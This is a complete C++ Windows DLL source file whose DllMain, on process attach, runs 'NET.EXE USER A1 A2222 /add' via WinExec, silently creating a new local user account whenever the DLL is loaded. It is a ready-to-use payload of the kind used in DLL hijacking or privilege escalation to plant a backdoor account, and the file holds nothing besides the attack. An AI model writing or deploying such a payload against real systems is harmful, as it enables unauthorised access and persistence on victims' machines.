// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

LPCSTR Command = "NET.EXE USER A1 A2222 /add";
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(Command, TRUE);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

